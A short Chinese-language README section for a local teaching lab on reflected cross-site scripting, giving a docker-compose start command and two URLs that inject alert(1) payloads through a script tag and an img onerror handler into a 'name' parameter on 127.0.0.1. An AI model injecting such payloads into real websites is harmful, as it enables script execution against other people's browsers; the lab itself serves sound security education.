### 反射型XSS

启动命令:

```shell
cd ./back-end/XSS/non-persistent
docker-compose up
```

打开浏览器，访问: [http://127.0.0.1:8082](http://127.0.0.1:8082)

尝试把url改为下面列表的任意一个:
* `http://127.0.0.1:8082/?name=<script>alert(1)</script>`
* `http://127.0.0.1:8082/?name=<img src="" onerror=alert(1)/>`
